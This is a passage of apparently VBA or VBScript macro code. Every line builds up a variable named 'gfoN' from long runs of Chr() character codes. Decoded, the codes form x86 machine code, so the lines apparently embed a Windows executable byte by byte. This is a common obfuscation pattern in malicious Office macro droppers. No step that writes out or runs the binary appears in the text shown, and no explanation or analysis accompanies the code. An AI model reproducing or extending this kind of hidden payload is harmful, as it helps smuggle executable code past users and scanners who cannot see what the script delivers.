gfoN=gfoN&Chr(244)&Chr(59)&Chr(243)&Chr(116)&Chr(106)&Chr(199)&Chr(6)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(131)&Chr(198)&Chr(8)&Chr(235)&Chr(26)&Chr(80)&Chr(232)&Chr(101)&Chr(4)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(139)&Chr(240)&Chr(235)&Chr(2)&Chr(51)&Chr(246)&Chr(59)&Chr(243)&Chr(116)&Chr(65)&Chr(255)&Chr(117)&Chr(248)&Chr(86)&Chr(87)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(216)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(34)&Chr(83)&Chr(83)&Chr(57)&Chr(93)&Chr(28)&Chr(117)&Chr(4)&Chr(83)&Chr(83)&Chr(235)&Chr(6)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(248)&Chr(86)&Chr(83)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(21)&Chr(52)&Chr(128)&Chr(64)
gfoN=gfoN&Chr(0)&Chr(137)&Chr(69)&Chr(248)&Chr(86)&Chr(232)&Chr(184)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(255)&Chr(117)&Chr(244)&Chr(232)&Chr(175)&Chr(253)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(89)&Chr(233)&Chr(89)&Chr(1)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(244)&Chr(137)&Chr(93)&Chr(240)&Chr(57)&Chr(93)&Chr(8)&Chr(117)&Chr(8)&Chr(139)&Chr(6)&Chr(139)&Chr(64)&Chr(20)&Chr(137)&Chr(69)&Chr(8)&Chr(57)&Chr(93)&Chr(32)&Chr(117)&Chr(8)&Chr(139)&Chr(6)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(32)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(4)&Chr(21)&Chr(0)&Chr(0)&Chr(89)&Chr(137)&Chr(69)&Chr(236)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(7)&Chr(51)&Chr(192)&Chr(233)&Chr(33)&Chr(1)&Chr(0)&Chr(0)&Chr(59)&Chr(69)&Chr(32)&Chr(15)&Chr(132)&Chr(219)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(83)&Chr(141)&Chr(77)&Chr(20)&Chr(81)&Chr(255)
gfoN=gfoN&Chr(117)&Chr(16)&Chr(80)&Chr(255)&Chr(117)&Chr(32)&Chr(232)&Chr(34)&Chr(21)&Chr(0)&Chr(0)&Chr(131)&Chr(196)&Chr(24)&Chr(137)&Chr(69)&Chr(244)&Chr(59)&Chr(195)&Chr(116)&Chr(212)&Chr(139)&Chr(53)&Chr(208)&Chr(128)&Chr(64)&Chr(0)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(20)&Chr(80)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(137)&Chr(69)&Chr(248)&Chr(59)&Chr(195)&Chr(117)&Chr(7)&Chr(51)&Chr(246)&Chr(233)&Chr(183)&Chr(0)&Chr(0)&Chr(0)&Chr(126)&Chr(61)&Chr(131)&Chr(248)&Chr(224)&Chr(119)&Chr(56)&Chr(131)&Chr(192)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(22)&Chr(232)&Chr(107)&Chr(20)&Chr(0)&Chr(0)&Chr(139)&Chr(252)&Chr(59)&Chr(251)&Chr(116)&Chr(221)&Chr(199)&Chr(7)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(131)&Chr(199)&Chr(8)&Chr(235)&Chr(26)&Chr(80)&Chr(232)&Chr(79)&Chr(3)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(139)&Chr(248)&Chr(235)&Chr(2)&Chr(51)&Chr(255)&Chr(59)&Chr(251)&Chr(116)&Chr(180)&Chr(255)&Chr(117)&Chr(248)&Chr(83)&Chr(87)&Chr(232)&Chr(178)&Chr(251)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(255)&Chr(117)&Chr(248)&Chr(87)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(244)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(214)&Chr(137)&Chr(69)&Chr(248)&Chr(59)&Chr(195)&Chr(117)&Chr(4)&Chr(51)&Chr(246)&Chr(235)&Chr(37)&Chr(255)&Chr(117)&Chr(28)&Chr(141)&Chr(69)&Chr(248)&Chr(255)&Chr(117)&Chr(24)&Chr(80)&Chr(87)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(117)&Chr(236)&Chr(232)&Chr(113)&Chr(20)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(137)&Chr(117)&Chr(240)&Chr(131)&Chr(196)&Chr(24)&Chr(247)&Chr(222)&Chr(27)&Chr(246)
gfoN=gfoN&Chr(35)&Chr(117)&Chr(248)&Chr(87)&Chr(232)&Chr(141)&Chr(252)&Chr(255)&Chr(255)&Chr(89)&Chr(235)&Chr(26)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(208)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(240)&Chr(57)&Chr(93)&Chr(244)&Chr(116)&Chr(9)&Chr(255)&Chr(117)&Chr(244)&Chr(232)&Chr(240)&Chr(229)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(69)&Chr(240)&Chr(59)&Chr(195)&Chr(116)&Chr(12)&Chr(57)&Chr(69)&Chr(24)&Chr(116)&Chr(7)&Chr(80)&Chr(232)&Chr(221)&Chr(229)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(198)&Chr(141)&Chr(101)&Chr(224)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(133)&Chr(248)&Chr(255)&Chr(255)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)
gfoN=gfoN&Chr(117)&Chr(8)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(224)&Chr(221)&Chr(255)&Chr(255)&Chr(255)&Chr(117)&Chr(40)&Chr(141)&Chr(77)&Chr(240)&Chr(255)&Chr(117)&Chr(36)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(232)&Chr(40)&Chr(252)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(32)&Chr(128)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(81)&Chr(81)&Chr(161)&Chr(248)&Chr(169)&Chr(64)&Chr(0)&Chr(51)&Chr(197)&Chr(137)&Chr(69)&Chr(252)&Chr(161)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(83)&Chr(86)&Chr(51)&Chr(219)&Chr(87)&Chr(139)&Chr(249)&Chr(59)&Chr(195)&Chr(117)&Chr(58)&Chr(141)&Chr(69)&Chr(248)&Chr(80)&Chr(51)&Chr(246)&Chr(70)
gfoN=gfoN&Chr(86)&Chr(104)&Chr(224)&Chr(136)&Chr(64)&Chr(0)&Chr(86)&Chr(255)&Chr(21)&Chr(224)&Chr(128)&Chr(64)&Chr(0)&Chr(133)&Chr(192)&Chr(116)&Chr(8)&Chr(137)&Chr(53)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(52)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(120)&Chr(117)&Chr(10)&Chr(106)&Chr(2)&Chr(88)&Chr(163)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(235)&Chr(5)&Chr(161)&Chr(192)&Chr(178)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(2)&Chr(15)&Chr(132)&Chr(207)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(195)&Chr(15)&Chr(132)&Chr(199)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(15)&Chr(133)&Chr(232)&Chr(0)&Chr(0)&Chr(0)&Chr(137)&Chr(93)&Chr(248)&Chr(57)&Chr(93)&Chr(24)&Chr(117)&Chr(8)&Chr(139)&Chr(7)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(24)&Chr(139)&Chr(53)&Chr(212)&Chr(128)&Chr(64)&Chr(0)&Chr(51)
gfoN=gfoN&Chr(192)&Chr(57)&Chr(93)&Chr(32)&Chr(83)&Chr(83)&Chr(255)&Chr(117)&Chr(16)&Chr(15)&Chr(149)&Chr(192)&Chr(255)&Chr(117)&Chr(12)&Chr(141)&Chr(4)&Chr(197)&Chr(1)&Chr(0)&Chr(0)&Chr(0)&Chr(80)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(214)&Chr(139)&Chr(248)&Chr(59)&Chr(251)&Chr(15)&Chr(132)&Chr(171)&Chr(0)&Chr(0)&Chr(0)&Chr(126)&Chr(60)&Chr(129)&Chr(255)&Chr(240)&Chr(255)&Chr(255)&Chr(127)&Chr(119)&Chr(52)&Chr(141)&Chr(68)&Chr(63)&Chr(8)&Chr(61)&Chr(0)&Chr(4)&Chr(0)&Chr(0)&Chr(119)&Chr(19)&Chr(232)&Chr(132)&Chr(18)&Chr(0)&Chr(0)&Chr(139)&Chr(196)&Chr(59)&Chr(195)&Chr(116)&Chr(28)&Chr(199)&Chr(0)&Chr(204)&Chr(204)&Chr(0)&Chr(0)&Chr(235)&Chr(17)&Chr(80)&Chr(232)&Chr(107)&Chr(1)&Chr(0)&Chr(0)&Chr(89)&Chr(59)&Chr(195)&Chr(116)&Chr(9)&Chr(199)&Chr(0)&Chr(221)&Chr(221)&Chr(0)&Chr(0)&Chr(131)&Chr(192)&Chr(8)&Chr(139)&Chr(216)
gfoN=gfoN&Chr(133)&Chr(219)&Chr(116)&Chr(105)&Chr(141)&Chr(4)&Chr(63)&Chr(80)&Chr(106)&Chr(0)&Chr(83)&Chr(232)&Chr(208)&Chr(249)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(87)&Chr(83)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(106)&Chr(1)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(214)&Chr(133)&Chr(192)&Chr(116)&Chr(17)&Chr(255)&Chr(117)&Chr(20)&Chr(80)&Chr(83)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(21)&Chr(224)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(69)&Chr(248)&Chr(83)&Chr(232)&Chr(201)&Chr(250)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(248)&Chr(89)&Chr(235)&Chr(117)&Chr(51)&Chr(246)&Chr(57)&Chr(93)&Chr(28)&Chr(117)&Chr(8)&Chr(139)&Chr(7)&Chr(139)&Chr(64)&Chr(20)&Chr(137)&Chr(69)&Chr(28)&Chr(57)&Chr(93)&Chr(24)&Chr(117)&Chr(8)&Chr(139)&Chr(7)&Chr(139)&Chr(64)&Chr(4)&Chr(137)&Chr(69)&Chr(24)&Chr(255)&Chr(117)&Chr(28)&Chr(232)&Chr(37)
gfoN=gfoN&Chr(18)&Chr(0)&Chr(0)&Chr(89)&Chr(131)&Chr(248)&Chr(255)&Chr(117)&Chr(4)&Chr(51)&Chr(192)&Chr(235)&Chr(71)&Chr(59)&Chr(69)&Chr(24)&Chr(116)&Chr(30)&Chr(83)&Chr(83)&Chr(141)&Chr(77)&Chr(16)&Chr(81)&Chr(255)&Chr(117)&Chr(12)&Chr(80)&Chr(255)&Chr(117)&Chr(24)&Chr(232)&Chr(77)&Chr(18)&Chr(0)&Chr(0)&Chr(139)&Chr(240)&Chr(131)&Chr(196)&Chr(24)&Chr(59)&Chr(243)&Chr(116)&Chr(220)&Chr(137)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(255)&Chr(117)&Chr(8)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(21)&Chr(220)&Chr(128)&Chr(64)&Chr(0)&Chr(116)&Chr(248)&Chr(59)&Chr(243)&Chr(116)&Chr(7)&Chr(86)&Chr(232)&Chr(222)&Chr(227)&Chr(255)&Chr(255)&Chr(89)&Chr(139)&Chr(199)&Chr(141)&Chr(101)&Chr(236)&Chr(95)&Chr(94)&Chr(91)&Chr(139)&Chr(77)&Chr(252)&Chr(51)&Chr(205)&Chr(232)&Chr(134)&Chr(246)&Chr(255)&Chr(255)
gfoN=gfoN&Chr(201)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(131)&Chr(236)&Chr(16)&Chr(255)&Chr(117)&Chr(8)&Chr(141)&Chr(77)&Chr(240)&Chr(232)&Chr(225)&Chr(219)&Chr(255)&Chr(255)&Chr(255)&Chr(117)&Chr(36)&Chr(141)&Chr(77)&Chr(240)&Chr(255)&Chr(117)&Chr(32)&Chr(255)&Chr(117)&Chr(28)&Chr(255)&Chr(117)&Chr(24)&Chr(255)&Chr(117)&Chr(20)&Chr(255)&Chr(117)&Chr(16)&Chr(255)&Chr(117)&Chr(12)&Chr(232)&Chr(22)&Chr(254)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(28)&Chr(128)&Chr(125)&Chr(252)&Chr(0)&Chr(116)&Chr(7)&Chr(139)&Chr(77)&Chr(248)&Chr(131)&Chr(97)&Chr(112)&Chr(253)&Chr(201)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(232)&Chr(148)&Chr(64)&Chr(0)&Chr(232)&Chr(16)&Chr(204)&Chr(255)&Chr(255)&Chr(131)&Chr(101)&Chr(228)&Chr(0)&Chr(139)&Chr(117)&Chr(8)&Chr(59)&Chr(53)&Chr(184)&Chr(182)&Chr(64)&Chr(0)&Chr(119)&Chr(34)&Chr(106)&Chr(4)&Chr(232)&Chr(74)&Chr(208)
gfoN=gfoN&Chr(255)&Chr(255)&Chr(89)&Chr(131)&Chr(101)&Chr(252)&Chr(0)&Chr(86)&Chr(232)&Chr(48)&Chr(243)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(9)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(69)&Chr(228)&Chr(232)&Chr(28)&Chr(204)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(4)&Chr(232)&Chr(69)&Chr(207)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(255)&Chr(85)&Chr(139)&Chr(236)&Chr(86)&Chr(139)&Chr(117)&Chr(8)&Chr(131)&Chr(254)&Chr(224)&Chr(15)&Chr(135)&Chr(161)&Chr(0)&Chr(0)&Chr(0)&Chr(83)&Chr(87)&Chr(139)&Chr(61)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(131)&Chr(61)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(0)&Chr(117)&Chr(24)&Chr(232)&Chr(212)&Chr(188)&Chr(255)&Chr(255)&Chr(106)&Chr(30)&Chr(232)&Chr(34)&Chr(187)&Chr(255)&Chr(255)&Chr(104)&Chr(255)&Chr(0)&Chr(0)&Chr(0)&Chr(232)
gfoN=gfoN&Chr(100)&Chr(184)&Chr(255)&Chr(255)&Chr(89)&Chr(89)&Chr(161)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(131)&Chr(248)&Chr(1)&Chr(117)&Chr(14)&Chr(133)&Chr(246)&Chr(116)&Chr(4)&Chr(139)&Chr(198)&Chr(235)&Chr(3)&Chr(51)&Chr(192)&Chr(64)&Chr(80)&Chr(235)&Chr(28)&Chr(131)&Chr(248)&Chr(3)&Chr(117)&Chr(11)&Chr(86)&Chr(232)&Chr(83)&Chr(255)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(117)&Chr(22)&Chr(133)&Chr(246)&Chr(117)&Chr(1)&Chr(70)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(86)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(215)&Chr(139)&Chr(216)&Chr(133)&Chr(219)&Chr(117)&Chr(46)&Chr(106)&Chr(12)&Chr(94)&Chr(57)&Chr(5)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(21)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(206)&Chr(214)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(116)&Chr(15)&Chr(139)&Chr(117)
gfoN=gfoN&Chr(8)&Chr(233)&Chr(123)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(75)&Chr(209)&Chr(255)&Chr(255)&Chr(137)&Chr(48)&Chr(232)&Chr(68)&Chr(209)&Chr(255)&Chr(255)&Chr(137)&Chr(48)&Chr(95)&Chr(139)&Chr(195)&Chr(91)&Chr(235)&Chr(20)&Chr(86)&Chr(232)&Chr(167)&Chr(214)&Chr(255)&Chr(255)&Chr(89)&Chr(232)&Chr(48)&Chr(209)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(51)&Chr(192)&Chr(94)&Chr(93)&Chr(195)&Chr(106)&Chr(12)&Chr(104)&Chr(8)&Chr(149)&Chr(64)&Chr(0)&Chr(232)&Chr(247)&Chr(202)&Chr(255)&Chr(255)&Chr(139)&Chr(77)&Chr(8)&Chr(51)&Chr(255)&Chr(59)&Chr(207)&Chr(118)&Chr(46)&Chr(106)&Chr(224)&Chr(88)&Chr(51)&Chr(210)&Chr(247)&Chr(241)&Chr(59)&Chr(69)&Chr(12)&Chr(27)&Chr(192)&Chr(64)&Chr(117)&Chr(31)&Chr(232)&Chr(252)&Chr(208)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(87)&Chr(87)&Chr(87)&Chr(87)
gfoN=gfoN&Chr(87)&Chr(232)&Chr(132)&Chr(208)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(20)&Chr(51)&Chr(192)&Chr(233)&Chr(213)&Chr(0)&Chr(0)&Chr(0)&Chr(15)&Chr(175)&Chr(77)&Chr(12)&Chr(139)&Chr(241)&Chr(137)&Chr(117)&Chr(8)&Chr(59)&Chr(247)&Chr(117)&Chr(3)&Chr(51)&Chr(246)&Chr(70)&Chr(51)&Chr(219)&Chr(137)&Chr(93)&Chr(228)&Chr(131)&Chr(254)&Chr(224)&Chr(119)&Chr(105)&Chr(131)&Chr(61)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(117)&Chr(75)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(137)&Chr(117)&Chr(12)&Chr(139)&Chr(69)&Chr(8)&Chr(59)&Chr(5)&Chr(184)&Chr(182)&Chr(64)&Chr(0)&Chr(119)&Chr(55)&Chr(106)&Chr(4)&Chr(232)&Chr(210)&Chr(206)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(255)&Chr(117)&Chr(8)&Chr(232)&Chr(183)&Chr(241)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)
gfoN=gfoN&Chr(255)&Chr(232)&Chr(95)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(93)&Chr(228)&Chr(59)&Chr(223)&Chr(116)&Chr(17)&Chr(255)&Chr(117)&Chr(8)&Chr(87)&Chr(83)&Chr(232)&Chr(13)&Chr(247)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(59)&Chr(223)&Chr(117)&Chr(97)&Chr(86)&Chr(106)&Chr(8)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(216)&Chr(59)&Chr(223)&Chr(117)&Chr(76)&Chr(57)&Chr(61)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(51)&Chr(86)&Chr(232)&Chr(190)&Chr(213)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(15)&Chr(133)&Chr(114)&Chr(255)&Chr(255)&Chr(255)&Chr(139)&Chr(69)&Chr(16)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(80)&Chr(255)&Chr(255)&Chr(255)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(233)&Chr(69)&Chr(255)&Chr(255)&Chr(255)&Chr(51)&Chr(255)&Chr(139)&Chr(117)
gfoN=gfoN&Chr(12)&Chr(106)&Chr(4)&Chr(232)&Chr(118)&Chr(205)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(59)&Chr(223)&Chr(117)&Chr(13)&Chr(139)&Chr(69)&Chr(16)&Chr(59)&Chr(199)&Chr(116)&Chr(6)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(139)&Chr(195)&Chr(232)&Chr(43)&Chr(202)&Chr(255)&Chr(255)&Chr(195)&Chr(106)&Chr(16)&Chr(104)&Chr(40)&Chr(149)&Chr(64)&Chr(0)&Chr(232)&Chr(217)&Chr(201)&Chr(255)&Chr(255)&Chr(139)&Chr(93)&Chr(8)&Chr(133)&Chr(219)&Chr(117)&Chr(14)&Chr(255)&Chr(117)&Chr(12)&Chr(232)&Chr(253)&Chr(253)&Chr(255)&Chr(255)&Chr(89)&Chr(233)&Chr(204)&Chr(1)&Chr(0)&Chr(0)&Chr(139)&Chr(117)&Chr(12)&Chr(133)&Chr(246)&Chr(117)&Chr(12)&Chr(83)&Chr(232)&Chr(34)&Chr(225)&Chr(255)&Chr(255)&Chr(89)&Chr(233)&Chr(183)&Chr(1)&Chr(0)&Chr(0)&Chr(131)&Chr(61)&Chr(204)&Chr(182)&Chr(64)&Chr(0)&Chr(3)&Chr(15)&Chr(133)&Chr(147)&Chr(1)&Chr(0)&Chr(0)
gfoN=gfoN&Chr(51)&Chr(255)&Chr(137)&Chr(125)&Chr(228)&Chr(131)&Chr(254)&Chr(224)&Chr(15)&Chr(135)&Chr(138)&Chr(1)&Chr(0)&Chr(0)&Chr(106)&Chr(4)&Chr(232)&Chr(223)&Chr(205)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(125)&Chr(252)&Chr(83)&Chr(232)&Chr(231)&Chr(232)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(224)&Chr(59)&Chr(199)&Chr(15)&Chr(132)&Chr(158)&Chr(0)&Chr(0)&Chr(0)&Chr(59)&Chr(53)&Chr(184)&Chr(182)&Chr(64)&Chr(0)&Chr(119)&Chr(73)&Chr(86)&Chr(83)&Chr(80)&Chr(232)&Chr(201)&Chr(237)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(12)&Chr(133)&Chr(192)&Chr(116)&Chr(5)&Chr(137)&Chr(93)&Chr(228)&Chr(235)&Chr(53)&Chr(86)&Chr(232)&Chr(152)&Chr(240)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(69)&Chr(228)&Chr(59)&Chr(199)&Chr(116)&Chr(39)&Chr(139)&Chr(67)&Chr(252)&Chr(72)&Chr(59)&Chr(198)&Chr(114)&Chr(2)&Chr(139)&Chr(198)&Chr(80)&Chr(83)&Chr(255)&Chr(117)&Chr(228)
gfoN=gfoN&Chr(232)&Chr(19)&Chr(226)&Chr(255)&Chr(255)&Chr(83)&Chr(232)&Chr(151)&Chr(232)&Chr(255)&Chr(255)&Chr(137)&Chr(69)&Chr(224)&Chr(83)&Chr(80)&Chr(232)&Chr(189)&Chr(232)&Chr(255)&Chr(255)&Chr(131)&Chr(196)&Chr(24)&Chr(57)&Chr(125)&Chr(228)&Chr(117)&Chr(72)&Chr(59)&Chr(247)&Chr(117)&Chr(6)&Chr(51)&Chr(246)&Chr(70)&Chr(137)&Chr(117)&Chr(12)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(137)&Chr(117)&Chr(12)&Chr(86)&Chr(87)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(184)&Chr(128)&Chr(64)&Chr(0)&Chr(137)&Chr(69)&Chr(228)&Chr(59)&Chr(199)&Chr(116)&Chr(32)&Chr(139)&Chr(67)&Chr(252)&Chr(72)&Chr(59)&Chr(198)&Chr(114)&Chr(2)&Chr(139)&Chr(198)&Chr(80)&Chr(83)&Chr(255)&Chr(117)&Chr(228)&Chr(232)&Chr(191)&Chr(225)&Chr(255)&Chr(255)&Chr(83)&Chr(255)&Chr(117)&Chr(224)&Chr(232)&Chr(112)&Chr(232)&Chr(255)&Chr(255)&Chr(131)&Chr(196)
gfoN=gfoN&Chr(20)&Chr(199)&Chr(69)&Chr(252)&Chr(254)&Chr(255)&Chr(255)&Chr(255)&Chr(232)&Chr(46)&Chr(0)&Chr(0)&Chr(0)&Chr(131)&Chr(125)&Chr(224)&Chr(0)&Chr(117)&Chr(49)&Chr(133)&Chr(246)&Chr(117)&Chr(1)&Chr(70)&Chr(131)&Chr(198)&Chr(15)&Chr(131)&Chr(230)&Chr(240)&Chr(137)&Chr(117)&Chr(12)&Chr(86)&Chr(83)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(192)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(235)&Chr(18)&Chr(139)&Chr(117)&Chr(12)&Chr(139)&Chr(93)&Chr(8)&Chr(106)&Chr(4)&Chr(232)&Chr(16)&Chr(204)&Chr(255)&Chr(255)&Chr(89)&Chr(195)&Chr(139)&Chr(125)&Chr(228)&Chr(133)&Chr(255)&Chr(15)&Chr(133)&Chr(191)&Chr(0)&Chr(0)&Chr(0)&Chr(57)&Chr(61)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(44)&Chr(86)&Chr(232)&Chr(18)&Chr(212)&Chr(255)&Chr(255)&Chr(89)&Chr(133)&Chr(192)&Chr(15)&Chr(133)&Chr(210)&Chr(254)
gfoN=gfoN&Chr(255)&Chr(255)&Chr(232)&Chr(147)&Chr(206)&Chr(255)&Chr(255)&Chr(57)&Chr(125)&Chr(224)&Chr(117)&Chr(108)&Chr(139)&Chr(240)&Chr(255)&Chr(21)&Chr(56)&Chr(128)&Chr(64)&Chr(0)&Chr(80)&Chr(232)&Chr(62)&Chr(206)&Chr(255)&Chr(255)&Chr(89)&Chr(137)&Chr(6)&Chr(235)&Chr(95)&Chr(133)&Chr(255)&Chr(15)&Chr(133)&Chr(131)&Chr(0)&Chr(0)&Chr(0)&Chr(232)&Chr(110)&Chr(206)&Chr(255)&Chr(255)&Chr(57)&Chr(125)&Chr(224)&Chr(116)&Chr(104)&Chr(199)&Chr(0)&Chr(12)&Chr(0)&Chr(0)&Chr(0)&Chr(235)&Chr(113)&Chr(133)&Chr(246)&Chr(117)&Chr(1)&Chr(70)&Chr(86)&Chr(83)&Chr(106)&Chr(0)&Chr(255)&Chr(53)&Chr(212)&Chr(176)&Chr(64)&Chr(0)&Chr(255)&Chr(21)&Chr(192)&Chr(128)&Chr(64)&Chr(0)&Chr(139)&Chr(248)&Chr(133)&Chr(255)&Chr(117)&Chr(86)&Chr(57)&Chr(5)&Chr(236)&Chr(181)&Chr(64)&Chr(0)&Chr(116)&Chr(52)&Chr(86)&Chr(232)&Chr(169)&Chr(211)&Chr(255)&Chr(255)&Chr(89)&Chr(133)
